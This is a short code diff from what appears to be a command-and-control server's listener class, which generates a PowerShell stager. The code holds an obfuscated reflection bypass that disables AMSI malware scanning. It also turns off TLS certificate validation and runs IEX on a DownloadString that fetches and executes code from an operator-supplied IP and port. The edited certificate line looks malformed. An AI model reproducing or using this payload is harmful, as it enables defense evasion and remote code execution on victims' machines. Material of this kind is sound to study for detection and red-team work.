@@ -119,7 +119,7 @@ class Listener():
                 listener.ip = ip
                 listener.save()
             amsi= '$apple=[Ref].Assembly.GetTypes();ForEach($banana in $apple) {if ($banana.Name -like "*siUtils") {$cherry=$banana}};$dogwater=$cherry.GetFields(\'NonPublic,Static\');ForEach($earache in $dogwater) {if ($earache.Name -like "*InitFailed") {$foxhole=$earache}};$foxhole.SetValue($null,$true);'
-            noCheckCert= '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = ;'
+            noCheckCert= '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = ${\ttrue };'
             oneliner = "{} {} IEX(New-Object Net.WebClient).DownloadString(\'https://{}:{}/sc/{}\')".format(amsi,noCheckCert,ip, str(port), eth)
             return JsonResponse({"payload" : oneliner} , status=200)
 
